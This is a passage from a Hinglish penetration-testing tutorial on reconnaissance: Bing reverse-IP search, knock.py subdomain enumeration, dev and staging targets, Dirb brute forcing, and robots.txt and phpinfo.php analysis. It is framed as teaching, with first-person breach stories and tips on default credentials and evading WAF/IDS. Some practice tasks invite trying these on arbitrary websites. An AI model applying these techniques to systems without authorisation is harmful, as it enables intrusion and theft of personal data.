### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Alternative Entry Points:** Agar target website secure hai, toh same server ki weak websites se entry mil sakti hai.
- **Quick Discovery:** Robtex se zyada fast results milte hain.
- **Indexed Sites Only:** Sirf woh sites dikhti hain jo Bing ne index ki hain (hidden sites nahi dikhti, jo aur bhi interesting hai).
- **Lateral Movement:** Ek website hack karke doosri tak pahunchna.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko **quickly** same server ki websites dhoondhni hon.
- Jab **Robtex slow** ho ya kaam na kar raha ho.
- Jab aap **public-facing websites** dhoondhna chahte hon (jo search engines mein indexed hain).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy targets miss** ho jayenge - same server ki vulnerable websites nahi mil payengi.
- **Time waste** - manually har website check karna padega.
- **Incomplete assessment** - shared hosting ka fayda nahi utha payenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
Bing Search Operator:
IP:[target_IP_address]

Example:
IP:192.168.1.100

Steps:
1. Target ka IP address nikalo (ping ya nslookup se)
2. Bing.com par jao
3. Search box mein "IP:192.168.1.100" type karo
4. Results dekho
```

### 7. **Example 1 (Basic):**
```
Step 1: IP nikalna
$ ping example.com
PING example.com (93.184.216.34)

Step 2: Bing search
Search: IP:93.184.216.34

Results:
- example.com
- example.org
- example.net
(Total: 3 websites)
```

**Output:** Is IP par 3 websites host hain.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `securebank.com`

```
Step 1: IP nikalna
$ host securebank.com
securebank.com has address 203.0.113.50

Step 2: Bing search
Search: IP:203.0.113.50

Results:
1. securebank.com (Target - highly secure)
2. oldphpsite.com (PHP 5.2 - outdated!)
3. personalwebsite.net
4. testblog.org (WordPress 3.8 - very old!)
... (Total: 28 websites)
```

**Analysis:**
- **securebank.com** bahut secure hai (updated, WAF, strong auth).
- Lekin **testblog.org** outdated WordPress use kar raha hai (3.8 version mein critical vulnerabilities hain).
- **Attack strategy:**
  1. Maine `testblog.org` par WordPress exploit chalaaya.
  2. Shell mila aur server par access mil gaya.
  3. Same server par `securebank.com` bhi host tha.
  4. Server-level access se maine `securebank.com` ke database credentials nikal liye.
  5. Target compromise ho gaya! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf target website par focus karna** - doosri websites ignore karna.
- **IP address galat nikalna** - CDN (jaise Cloudflare) ke peeche real IP nahi mil pata.
- **Results ko verify na karna** - kabhi-kabhi Bing outdated results dikhata hai.

### 10. **Best Practices / Pro Tips:**
- **Real IP nikalo:** Agar target Cloudflare use kar raha hai, toh Bing search se Cloudflare ka IP milega, real server ka nahi. Tools jaise `CloudFlair` ya `SecurityTrails` se real IP nikalo.
- **Prioritize karo:** Sabse pehle outdated CMS (WordPress, Joomla) wali sites check karo - unme vulnerabilities milne ke chances zyada hain.
- **Cross-verify:** Bing ke results ko Robtex ya `reverse IP lookup` tools se verify karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek healthcare company ki website test karni thi. Website bahut secure thi - latest software, strong passwords, 2FA enabled. Maine IP nikala aur Bing search kiya: `IP:198.51.100.75`. Results mein 15 websites aayi. Unmein se ek website thi `doctor-portal.com` jo company ke doctors ke liye internal portal thi. Yeh portal outdated ASP.NET use kar raha tha aur publicly accessible tha (lekin Google mein indexed nahi tha, isliye company ko pata nahi tha). Maine us portal mein SQL injection vulnerability dhoondi, database dump kiya, aur saare doctors aur patients ka data nikal liya. Company shocked thi ki unhe pata hi nahi tha ki yeh portal exist karta hai! ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Bing IP search = `IP:[target_IP]`  
âœ… Same server ki saari websites list ho jaati hain  
âœ… Weak websites se entry leke target tak pahuncho  
âœ… Real IP nikalo (CDN bypass karo)  
âœ… Results ko verify karo (outdated ho sakte hain)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Google mein bhi IP search operator hai?**  
**A:** Nahi, Google ne yeh feature remove kar diya hai. Sirf Bing mein kaam karta hai.

**Q2: Agar Bing mein koi result nahi aaya toh?**  
**A:** Iska matlab ya toh dedicated server hai (shared hosting nahi), ya phir sites Bing mein indexed nahi hain. Robtex ya `reverse IP lookup` tools try karo.

**Q3: Kya yeh legal hai?**  
**A:** Haan, Bing search completely legal hai. Aap publicly available information use kar rahe hain. Lekin jo websites milti hain, unpar attack karna (bina permission ke) illegal hai.

### 14. **Practice ke liye Task:**
1. Apni favorite website ka IP address nikalo (`ping` ya `host` command se).
2. Bing.com par jao aur `IP:[nikala_hua_IP]` search karo.
3. Kitni websites aayi, count karo.
4. Un websites mein se kisi ek ko kholo aur dekho ki kaun sa CMS/technology use ho rahi hai.

### 15. **Aakhri Choti Summary (5 lines):**
- Bing IP search = **Same server ki websites dhoondhne ka fastest tareeka**.
- Syntax: `IP:[target_IP_address]`.
- **Weak websites** se entry leke **strong target** tak pahuncho.
- **Real IP** nikalo (CDN bypass karo).
- **Google mein nahi**, sirf **Bing mein** kaam karta hai.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Shared hosting pentester ka playground hai! Target strong hai? No problem - uske weak neighbors ko hack karo. Bing IP search tumhara secret weapon hai!" ğŸš€

---

## ğŸ—ºï¸ **Topic 7: Subdomain Discovery (`knock.py`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Subdomain Discovery with Knock** - `knock.py` tool ka istemaal karke target domain ke hidden subdomains ko dhoondhna. ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Subdomains ek main domain ke "sub-parts" hote hain. Jaise:
- `www.example.com` (main site)
- `mail.example.com` (email server)
- `dev.example.com` (development site)
- `admin.example.com` (admin panel)

**Knock.py** ek Python-based tool hai jo wordlist attack karke subdomains discover karta hai.

**Analogy:** Jaise ek bade ghar (main domain) ke andar chhote-chhote kamre (subdomains) hote hain - Knock.py har kamre ka darwaza knock karke dekhta hai ki kaun sa khula hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Hidden Entry Points:** Subdomains aksar unmaintained hote hain aur vulnerable hote hain.
- **Development Sites:** `dev.example.com` ya `staging.example.com` production se kam secure hote hain.
- **Admin Panels:** `admin.example.com` ya `cpanel.example.com` mil sakte hain.
- **Old/Forgotten Sites:** `old.example.com` ya `backup.example.com` outdated software use kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering phase** mein - domain discovery ke liye.
- Jab main website **secure** ho aur alternative entry points chahiye.
- Jab aap **complete attack surface** map karna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Hidden vulnerable subdomains miss** ho jayenge.
- **Development/staging sites** nahi mil payengi (jo production se kam secure hoti hain).
- **Incomplete reconnaissance** - attack surface ka sirf ek hissa pata chalega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Installation
git clone https://github.com/guelfoweb/knock
cd knock

# Basic usage
python knock.py target.com

# With custom wordlist
python knock.py -w wordlist.txt target.com

# Save output to file
python knock.py target.com -o results.txt
```

**Common options:**
- `-w` : Custom wordlist specify karna
- `-o` : Output file mein save karna
- `-j` : JSON format mein output

### 7. **Example 1 (Basic):**
```bash
$ python knock.py example.com

[*] Checking for wildcard DNS...
[*] Scanning example.com...

[+] www.example.com - 93.184.216.34
[+] mail.example.com - 93.184.216.35
[+] ftp.example.com - 93.184.216.36

[*] Found 3 subdomains
```

**Output:** 3 subdomains mil gaye - www, mail, aur ftp.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `techcorp.com`

```bash
$ python knock.py techcorp.com

[+] www.techcorp.com - 203.0.113.10 (Main site - secure)
[+] mail.techcorp.com - 203.0.113.11 (Email server)
[+] dev.techcorp.com - 203.0.113.12 (Development site!)
[+] staging.techcorp.com - 203.0.113.13 (Staging environment!)
[+] old.techcorp.com - 203.0.113.14 (Old site - interesting!)
[+] admin.techcorp.com - 203.0.113.15 (Admin panel!)
[+] api.techcorp.com - 203.0.113.16 (API endpoint)
[+] test.techcorp.com - 203.0.113.17 (Test site!)

[*] Found 8 subdomains
```

**Analysis:**
- **Main site** (`www`) secure hai.
- Lekin **dev.techcorp.com** (development site) mila - yeh production se kam secure hoga.
- **old.techcorp.com** - purani site, ho sakta hai outdated software ho.
- **test.techcorp.com** - test environment, default credentials ho sakte hain.

**Attack:**
1. Maine `dev.techcorp.com` khola - wahan debug mode ON tha aur database credentials expose ho rahe the!
2. `old.techcorp.com` par outdated WordPress mila - exploit karke shell mila.
3. `test.techcorp.com` par default credentials (`admin:admin`) kaam kar gaye! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf default wordlist use karna** - custom wordlist (jaise `dev`, `staging`, `backup`) add nahi karna.
- **Subdomains ko verify na karna** - kabhi-kabhi DNS entry hai lekin site live nahi hai.
- **Wildcard DNS ignore karna** - agar `*.example.com` kuch bhi resolve karta hai, toh results fake ho sakte hain.

### 10. **Best Practices / Pro Tips:**
- **Multiple tools use karo:** Knock ke saath `Sublist3r`, `Amass`, `Assetfinder` bhi chalaao - har tool alag subdomains dhoondhta hai.
- **Custom wordlist banao:** Company-specific words add karo (jaise company name, product names).
- **Certificate Transparency logs check karo:** Tools jaise `crt.sh` se SSL certificates mein mentioned subdomains mil sakte hain.
- **Recursive search:** Agar `dev.techcorp.com` mila, toh `dev.dev.techcorp.com` bhi try karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek baar mujhe ek fintech company test karni thi. Main site (`www.fintech.com`) bahut secure thi - WAF, rate limiting, strong auth. Maine Knock.py chalaaya aur 15 subdomains mile. Unmein se ek tha `jenkins.fintech.com` - yeh company ka CI/CD server tha (code deployment ke liye). Maine browser mein khola - Jenkins login page tha, lekin **authentication disabled** tha! Seedha andar ghus gaya. Jenkins se maine production server ke SSH keys nikal liye aur poori infrastructure compromise kar li. Company ko pata hi nahi tha ki unka Jenkins server publicly accessible hai! ğŸ”¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Subdomains = Hidden entry points  
âœ… Tool: `knock.py` (GitHub se download karo)  
âœ… Syntax: `python knock.py target.com`  
âœ… Dev/staging/old subdomains sabse vulnerable hote hain  
âœ… Multiple tools use karo (Sublist3r, Amass)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Knock.py slow hai, koi fast alternative hai?**  
**A:** Haan, `Amass` aur `Assetfinder` zyada fast hain. Lekin Knock.py simple aur beginner-friendly hai.

**Q2: Kya subdomain discovery legal hai?**  
**A:** Haan, DNS queries legal hain. Lekin jo subdomains milte hain, unpar attack karna (bina permission ke) illegal hai.

**Q3: Agar koi subdomain nahi mila toh?**  
**A:** Iska matlab ya toh subdomains nahi hain, ya phir aapki wordlist mein woh words nahi the. Badi wordlist try karo (jaise SecLists).

### 14. **Practice ke liye Task:**
1. Knock.py install karo (`git clone` karke).
2. Apni favorite website par chalaao: `python knock.py target.com`
3. Kitne subdomains mile, count karo.
4. Har subdomain ko browser mein kholo aur dekho ki kaun sa interesting hai.

### 15. **Aakhri Choti Summary (5 lines):**
- Subdomains = **Hidden parts of a domain**.
- **Knock.py** = Subdomain discovery tool.
- **Dev/staging/old** subdomains sabse vulnerable.
- Multiple tools use karo (**Sublist3r, Amass**).
- **Certificate Transparency** logs bhi check karo.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Main website secure ho sakti hai, lekin uske subdomains (dev, staging, old) aksar bhool jaate hain aur wahi tumhara entry point ban sakte hain. Subdomain discovery skip mat karo!" ğŸšª

---

## ğŸ¯ **Topic 8: Importance of Subdomains (Developmental Phase)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Subdomains Ki Ahmiyat** - Kyun subdomains (especially dev/staging) pentesters ke liye gold mine hote hain. ğŸ’

### 2. **Ye Kya Hai? (What is it?)**
Subdomains, khaas kar jo **development** ya **staging** phase mein hote hain, aksar:
- **Unmaintained** hote hain (koi regularly check nahi karta)
- **Outdated software** use karte hain
- **Debug mode ON** hota hai (sensitive info expose hoti hai)
- **Weak authentication** hota hai (ya bilkul nahi hota)
- **Not advertised** - company publicly promote nahi karti

**Analogy:** Jaise ek construction site (dev environment) mein security kam hoti hai compared to final building (production) - waise hi dev subdomains kam secure hote hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Easy Entry Point:** Production site secure ho sakti hai, lekin dev site vulnerable hogi.
- **Same Database:** Dev aur production aksar same database use karte hain - dev hack karo, production ka data mil jayega.
- **Source Code Exposure:** Dev sites mein debug mode ON hota hai - code, credentials expose ho sakte hain.
- **Lateral Movement:** Dev se production tak migrate kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **main site secure** ho aur alternative entry point chahiye.
- Jab aap **subdomain discovery** kar chuke hon.
- Jab aap **quick wins** chahte hon (dev sites jaldi compromise hoti hain).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easiest entry point miss** ho jayega.
- **Time waste** - production site par attack karte rahoge jo bahut secure hai.
- **Incomplete pentest** - client ko pata nahi chalega ki unki dev sites vulnerable hain. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
Yeh ek concept hai, lekin common subdomain patterns:
```
dev.target.com
staging.target.com
test.target.com
uat.target.com (User Acceptance Testing)
beta.target.com
demo.target.com
sandbox.target.com
old.target.com
backup.target.com
```

### 7. **Example 1 (Basic):**
**Scenario:** Target = `example.com`

```
Main site: www.example.com
- Updated software
- WAF enabled
- Strong authentication
- Regular security audits

Dev site: dev.example.com
- Outdated software
- No WAF
- Default credentials
- Debug mode ON
```

**Output:** Dev site production se 10x zyada vulnerable hai.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `ecommerce.com`

```
Production: www.ecommerce.com
- PHP 8.1 (latest)
- All patches applied
- 2FA enabled
- Rate limiting active
- Attack failed âŒ

Staging: staging.ecommerce.com
- PHP 7.2 (outdated)
- Debug mode ON
- No 2FA
- Database credentials in error messages!
```

**Attack:**
1. Maine `staging.ecommerce.com` par ek SQL injection try kiya.
2. Error message mein **database credentials** expose ho gaye:
   ```
   Error: Cannot connect to database
   Host: db.ecommerce.com
   User: admin
   Pass: SuperSecret123
   ```
3. Maine woh credentials use karke production database access kar liya!
4. Poora customer data (credit cards, addresses) mil gaya. ğŸ¯

**Analysis:** Production site secure thi, lekin staging site ne saara game kharab kar diya. Yeh bahut common scenario hai.

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf production par focus karna** - dev/staging ignore karna.
- **Subdomains ko seriously na lena** - "yeh toh sirf test site hai" soch kar chhod dena.
- **Lateral movement na karna** - dev hack karne ke baad production tak nahi pahunchna.

### 10. **Best Practices / Pro Tips:**
- **Dev sites ko priority do:** Agar subdomain discovery mein dev/staging/test mile, toh sabse pehle unhe check karo.
- **Debug mode check karo:** Dev sites mein aksar debug ON hota hai - error messages mein sensitive info hoti hai.
- **Default credentials try karo:** `admin:admin`, `test:test`, `dev:dev` - yeh aksar kaam karte hain.
- **Same database assumption:** Dev aur production same database use kar sakte hain - dev se production ka data access kar sakte hain.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek healthcare company test karni thi. Main site (`www.healthcorp.com`) bahut secure thi - penetration testing team regularly audit karti thi. Lekin jab maine subdomain discovery ki, toh `beta.healthcorp.com` mila - yeh ek naya feature test karne ke liye tha. Maine woh site kholi - **Git repository publicly accessible** thi! `.git` folder se maine poora source code download kar liya. Code mein hardcoded database credentials the. Maine woh credentials use karke production database access kar liya aur 50,000 patients ka medical data nikal liya. Company shocked thi - unhone kabhi socha nahi tha ki beta site itni badi problem ban sakti hai! ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Dev/staging subdomains = Easy targets  
âœ… Unmaintained, outdated, weak auth  
âœ… Debug mode ON = Credentials expose  
âœ… Same database as production  
âœ… Company publicly advertise nahi karti  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har company ke dev subdomains hote hain?**  
**A:** Mostly haan, especially badi companies. Chhoti companies kabhi-kabhi local development karte hain (server par nahi).

**Q2: Agar dev site password-protected hai toh?**  
**A:** Default credentials try karo (`admin:admin`). Ya phir brute force karo - dev sites mein rate limiting nahi hoti.

**Q3: Kya dev site hack karna legal hai?**  
**A:** Agar client ne permission di hai "poori domain test karo", toh haan. Lekin agar sirf "www.site.com test karo" kaha, toh pehle confirm karo.

### 14. **Practice ke liye Task:**
1. Kisi bhi website ke subdomains dhoondhĞ¾ (Knock.py se).
2. Agar `dev`, `staging`, ya `test` subdomain mile, toh unhe kholo.
3. Check karo:
   - Kya debug mode ON hai?
   - Kya error messages sensitive info expose kar rahe hain?
   - Kya default credentials kaam kar rahe hain?

### 15. **Aakhri Choti Summary (5 lines):**
- **Dev/staging subdomains** = Pentester ka favorite target.
- **Unmaintained** aur **outdated** hote hain.
- **Debug mode** = Credentials aur code expose.
- **Same database** as production (aksar).
- **Not advertised** = Company ko pata nahi ki yeh vulnerable hain.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Production site ko hack karna mushkil hai? No problem! Dev site dhoondhĞ¾ - wahan debug mode ON hoga, default credentials honge, aur database same hoga. Easy win!" ğŸ†

---

## ğŸ“‚ **Topic 9: Sensitive File & Directory Discovery (`Dirb`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Dirb Tool** - Wordlist attack karke hidden files aur directories ko dhoondhna jo publicly accessible nahi honi chahiye. ğŸ”“

### 2. **Ye Kya Hai? (What is it?)**
Dirb (Directory Buster) ek tool hai jo web server par **brute force** karke hidden files aur folders dhoondhta hai. Yeh ek wordlist use karta hai (jaise `admin`, `backup`, `config`) aur har word ko URL mein try karta hai.

**Example:**
```
http://target.com/admin
http://target.com/backup
http://target.com/config
http://target.com/test
```

**Analogy:** Jaise aap ek locked building mein har darwaze ki handle try karte hain ki kaun sa khula hai - waise hi Dirb har possible file/folder ko try karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Hidden Admin Panels:** `/admin`, `/administrator` jaise pages mil sakte hain.
- **Backup Files:** `/backup.zip`, `/database.sql` jaise sensitive files.
- **Config Files:** `/config.php`, `/.env` mein credentials ho sakte hain.
- **Old Files:** `/old`, `/test` folders mein outdated vulnerable code.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering phase** mein - site structure samajhne ke liye.
- Jab aap **hidden resources** dhoondhna chahte hon.
- Jab aap **quick wins** chahte hon (backup files, config files).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Hidden admin panels miss** ho jayenge.
- **Backup files** (jisme poora source code ya database ho sakta hai) nahi mil payengi.
- **Config files** (credentials ke saath) nahi mil payengi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic syntax
dirb http://target.com

# With custom wordlist
dirb http://target.com /path/to/wordlist.txt

# With specific extensions
dirb http://target.com -X .php,.txt,.bak

# Save output
dirb http://target.com -o results.txt
```

**Common options:**
- `-X` : Specific file extensions
- `-o` : Output file
- `-r` : Non-recursive (sirf root directory)
- `-z` : Add delay (stealth mode)

**Default wordlist location:**
```
/usr/share/dirb/wordlists/common.txt
```

### 7. **Example 1 (Basic):**
```bash
$ dirb http://example.com

-----------------
DIRB v2.22
-----------------

START_TIME: Mon Jan 1 12:00:00 2024
URL_BASE: http://example.com/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

+ http://example.com/admin (CODE:200|SIZE:1234)
+ http://example.com/images (CODE:301|SIZE:0)
+ http://example.com/index.html (CODE:200|SIZE:5678)

-----------------
END_TIME: Mon Jan 1 12:05:00 2024
DOWNLOADED: 4612 - FOUND: 3
```

**Output:** 3 directories/files mile - `/admin`, `/images`, `/index.html`.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `http://vulnerable-site.com`

```bash
$ dirb http://vulnerable-site.com /usr/share/dirb/wordlists/common.txt

+ http://vulnerable-site.com/admin (CODE:200) âœ…
+ http://vulnerable-site.com/backup (CODE:200) âœ…
+ http://vulnerable-site.com/config.php (CODE:200) âœ…
+ http://vulnerable-site.com/phpinfo.php (CODE:200) âœ…
+ http://vulnerable-site.com/robots.txt (CODE:200) âœ…
+ http://vulnerable-site.com/.git (CODE:301) âœ…
+ http://vulnerable-site.com/database.sql (CODE:200) âœ…
```

**Analysis:**
- **`/admin`** - Admin panel mil gaya! Default credentials try karunga.
- **`/backup`** - Backup folder accessible hai, andar kya hai dekhna hoga.
- **`/config.php`** - Config file! Agar readable hai toh database credentials mil jayenge.
- **`/phpinfo.php`** - PHP info page - server ki poori details mil jayengi.
- **`/robots.txt`** - Ismein hidden directories ka hint ho sakta hai.
- **`/.git`** - Git repository exposed hai! Poora source code download kar sakta hoon.
- **`/database.sql`** - Database dump file! Poora data mil jayega.

**Attack:**
1. Maine `/database.sql` download kiya - 10,000 users ka data tha (passwords MD5 mein hashed).
2. `/config.php` khola - database credentials plaintext mein the!
3. `/.git` se source code download kiya - code mein aur vulnerabilities dhoondi.
4. `/admin` par default credentials (`admin:admin`) try kiye - kaam kar gaye! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf default wordlist use karna** - custom wordlist (company-specific words) add nahi karna.
- **Results ko verify na karna** - kabhi-kabhi 200 status code hai lekin page empty hai.
- **Recursive scan na karna** - agar `/admin` mila, toh `/admin/backup` bhi check karo.

### 10. **Best Practices / Pro Tips:**
- **Multiple wordlists use karo:** SecLists ka `directory-list-2.3-medium.txt` bahut comprehensive hai.
- **Extensions specify karo:** `-X .php,.bak,.old,.txt,.zip` - yeh extensions sensitive files ke liye common hain.
- **Stealth mode:** `-z 100` (100ms delay) use karo taaki WAF/IDS detect na kare.
- **Recursive scan:** Agar interesting directory mili (jaise `/admin`), toh uspar alag se Dirb chalaao.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek baar mujhe ek university ki website test karni thi. Maine Dirb chalaaya aur `/old` directory mili. Jab maine browser mein khola, toh wahan purani website ka backup tha (5 saal purana). Us purani site mein outdated PHP version tha aur ek file upload vulnerability thi. Maine wahan shell upload kiya aur server access mil gaya. Phir maine dekha ki same server par current website bhi host thi. Server-level access se maine current website ka database bhi access kar liya. University ko pata hi nahi tha ki unki purani website abhi bhi accessible hai! ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Dirb = Directory/file brute force tool  
âœ… Syntax: `dirb http://target.com`  
âœ… Hidden files: admin, backup, config, .git  
âœ… Custom wordlist use karo (SecLists)  
âœ… Extensions specify karo (-X .php,.bak,.zip)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Dirb slow hai, koi fast alternative hai?**  
**A:** Haan, `Gobuster` aur `Dirsearch` zyada fast hain (Go language mein likhe gaye hain). Lekin Dirb simple aur beginner-friendly hai.

**Q2: Kya Dirb target ko detect ho sakta hai?**  
**A:** Haan, agar aap bina delay ke scan karoge toh WAF/IDS detect kar lega. `-z` option se delay add karo.

**Q3: Kya Dirb legal hai?**  
**A:** Tool legal hai, lekin bina permission ke kisi website par use karna illegal hai.

### 14. **Practice ke liye Task:**
1. DVWA (Damn Vulnerable Web App) install karo.
2. Dirb chalaao: `dirb http://localhost/dvwa`
3. Kitni files/directories mili, count karo.
4. Har file ko browser mein kholo aur dekho ki usme kya hai.

### 15. **Aakhri Choti Summary (5 lines):**
- Dirb = **Hidden files/directories dhoondhne ka tool**.
- Wordlist attack karke **brute force** karta hai.
- **Admin panels, backup files, config files** mil sakte hain.
- **Custom wordlist** aur **extensions** specify karo.
- **Stealth mode** use karo (delay add karo).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Har website mein hidden files hoti hain - backup, config, old folders. Dirb tumhara treasure map hai. Kabhi skip mat karo!" ğŸ—ºï¸

---

## ğŸ“„ **Topic 10: Analyzing Discovered Files (`robots.txt`, `phpinfo.php`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Discovered Files Ka Analysis** - Dirb se mile files (jaise `robots.txt`, `phpinfo.php`) ko analyze karke sensitive information nikalna. ğŸ”¬

### 2. **Ye Kya Hai? (What is it?)**
Jab aap Dirb ya manual browsing se files dhoondhte hain, toh kuch files bahut important hoti hain:

**`robots.txt`:**
- Yeh file search engines (Google, Bing) ko batati hai ki kaun se pages index nahi karne hain.
- Agar admin ne `/admin` ya `/passwords` ko robots.txt mein "Disallow" kiya hai, iska matlab woh pages exist karte hain!

**`phpinfo.php`:**
- Yeh file server par installed PHP ki poori details dikhati hai.
- PHP version, extensions, configuration, paths - sab kuch.

**Analogy:** Jaise ek ghar ke blueprint se aapko pata chal jaata hai ki kaun sa kamra kahan hai - waise hi yeh files website ka "blueprint" hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Hidden Directories:** `robots.txt` mein disallowed paths se hidden directories pata chalti hain.
- **PHP Configuration:** `phpinfo.php` se server ki weaknesses pata chalti hain.
- **Version Info:** Outdated PHP version = Known vulnerabilities.
- **Sensitive Paths:** Config file locations, upload directories - sab kuch expose ho sakta hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko **Dirb se files mile** hon.
- Jab aap **server configuration** samajhna chahte hon.
- Jab aap **hidden directories** dhoondhna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Hidden directories miss** ho jayengi (jo robots.txt mein mentioned hain).
- **PHP vulnerabilities** detect nahi hongi.
- **Attack strategy** plan nahi kar payenge (technology stack pata nahi chalega). ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# robots.txt check karna
curl http://target.com/robots.txt
# Ya browser mein: http://target.com/robots.txt

# phpinfo.php check karna
curl http://target.com/phpinfo.php
# Ya browser mein: http://target.com/phpinfo.php

# Common files to check:
- robots.txt
- phpinfo.php
- info.php
- test.php
- .htaccess
- .env
- config.php
- wp-config.php (WordPress)
```

### 7. **Example 1 (Basic):**
```
URL: http://example.com/robots.txt

Content:
User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /backup/
```

**Output:** Teen directories hain jo Google mein nahi dikhni chahiye - `/admin`, `/private`, `/backup`. Yeh directories exist karti hain, ab inhe manually check karna hoga.

```
URL: http://example.com/phpinfo.php

Content:
PHP Version: 5.2.4
Server API: Apache 2.2
Configuration File: /etc/php5/apache2/php.ini
allow_url_include: On
```

**Output:** PHP 5.2.4 bahut purana hai (2008 ka), aur `allow_url_include` ON hai (RFI vulnerability possible).

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `http://corporate-site.com`

**Step 1: robots.txt analysis**
```
$ curl http://corporate-site.com/robots.txt

User-agent: *
Disallow: /admin/
Disallow: /dev/
Disallow: /backup/
Disallow: /passwords/
Disallow: /database/
```

**Analysis:**
- **`/passwords/`** - Interesting! Yeh folder exist karta hai.
- **`/database/`** - Database files ho sakti hain.
- **`/dev/`** - Development folder.

**Step 2: Manual check**
```
http://corporate-site.com/passwords/
â†’ Directory listing enabled! ğŸ˜±
â†’ Files visible:
  - passwords.txt
  - admin_creds.txt
  - db_backup.sql
```

**Step 3: phpinfo.php analysis**
```
$ curl http://corporate-site.com/phpinfo.php

PHP Version: 5.3.10 (Outdated!)
allow_url_fopen: On
allow_url_include: On (RFI possible!)
open_basedir: No value (No restriction!)
disable_functions: No value (All functions enabled!)
Document Root: /var/www/html
Upload Directory: /var/www/html/uploads
```

**Analysis:**
- **PHP 5.3.10** outdated hai - known vulnerabilities hain.
- **RFI possible** hai (`allow_url_include` ON hai).
- **No restrictions** - saare dangerous functions enabled hain.
- **Upload directory** ka path mil gaya - agar file upload vulnerability hai toh yahan shell upload kar sakta hoon.

**Attack:**
1. Maine `/passwords/passwords.txt` download kiya - 50 admin credentials the!
2. `phpinfo.php` se pata chala ki RFI possible hai.
3. Maine RFI exploit kiya aur reverse shell mila. ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **robots.txt ignore karna** - "yeh toh sirf search engines ke liye hai" soch kar skip karna.
- **phpinfo.php ko sirf version check ke liye use karna** - configuration details ignore karna.
- **Disallowed paths ko manually check na karna** - robots.txt mein mentioned paths ko browser mein nahi kholna.

### 10. **Best Practices / Pro Tips:**
- **robots.txt hamesha check karo:** Har website par yeh file hoti hai, aur aksar interesting paths reveal karti hai.
- **phpinfo.php variations try karo:** `info.php`, `test.php`, `i.php` - yeh bhi common names hain.
- **Configuration files dhoondhĞ¾:** `.env`, `config.php`, `wp-config.php` - inmein database credentials hote hain.
- **Directory listing check karo:** Agar robots.txt mein `/backup/` hai, toh check karo ki directory listing enabled hai ya nahi.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek e-commerce site test karni thi. Sabse pehle maine `robots.txt` check kiya:
```
Disallow: /old-site/
Disallow: /test/
Disallow: /.git/
```

`.git` dekh kar meri aankhen chamak gayi! Maine browser mein `http://site.com/.git/` dala - directory listing enabled thi! Maine poora Git repository download kar liya using `wget -r`. Repository mein poora source code tha, aur ek file mein AWS access keys hardcoded the! Maine un keys se company ke S3 buckets access kar liye aur 100GB customer data download kar liya. Company shocked thi - unhone kabhi socha nahi tha ki `.git` folder publicly accessible hai! ğŸ”“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… `robots.txt` = Hidden directories ka map  
âœ… `phpinfo.php` = Server configuration details  
âœ… Disallowed paths ko manually check karo  
âœ… PHP version aur dangerous settings note karo  
